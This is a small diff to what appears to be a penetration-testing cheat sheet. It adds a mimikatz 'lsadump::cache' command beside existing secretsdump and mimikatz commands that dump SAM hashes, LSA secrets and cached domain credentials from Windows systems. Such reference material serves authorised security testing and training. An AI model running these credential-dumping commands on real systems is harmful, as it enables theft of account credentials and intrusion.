@@ -49,6 +49,7 @@ secretsdump -sam sam -system system -security security LOCAL
 mimikatz # privilege::debug
 mimikatz # lsadump::sam
 mimikatz # lsadump::secrets
+mimikatz # lsadump::cache
 ```
 
 ```bash [nxc]
